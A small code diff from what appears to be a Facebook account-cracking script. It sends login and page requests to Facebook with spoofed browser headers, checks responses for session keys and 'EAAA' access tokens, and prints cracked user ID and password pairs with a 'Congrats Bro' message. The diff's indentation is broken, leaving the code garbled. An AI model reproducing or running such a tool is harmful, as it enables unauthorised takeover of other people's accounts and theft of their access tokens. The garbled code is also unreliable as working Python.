@@ -1279,9 +1279,9 @@ class Main:
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
 }
+			response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
 
-response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
-			        lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			
 			        if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[ FaRYaL-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
